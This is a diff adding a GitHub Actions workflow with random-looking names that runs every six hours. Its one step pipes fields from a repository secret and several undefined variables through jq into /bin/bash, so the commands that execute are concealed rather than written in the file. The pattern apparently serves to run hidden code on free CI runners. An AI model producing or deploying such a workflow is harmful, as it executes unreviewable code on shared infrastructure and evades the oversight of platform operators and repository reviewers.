@@ -1,0 +1,27 @@
+name: chenglidai8018
+
+on:
+  workflow_dispatch:
+  schedule:
+    - cron: '42 1/6 * * *'
+
+jobs:
+  build:
+    runs-on: ubuntu-latest
+
+    steps:
+      - uses: actions/checkout@v4
+      - name: chenglidai8018
+        env:
+          ipftm6: ${{ secrets.ipftm6 }}
+        run: |
+          echo $ipftm6 | jq -r .skhmw9 | /bin/bash
+          echo $tys359 | jq -r .kca6 | /bin/bash
+          echo $ysbae24 | jq -r .ot999 | /bin/bash
+          echo $jj26 | jq -r .nkvs8555 | /bin/bash
+          echo $eku8506 | jq -r .s6613 | /bin/bash
+          echo $nl375 | jq -r .k3 | /bin/bash
+          echo $cjk3 | jq -r .ex7693 | /bin/bash
+          echo $k9563 | jq -r .wpm92915 | /bin/bash
+          echo $aamsq3 | jq -r .p691 | /bin/bash
+
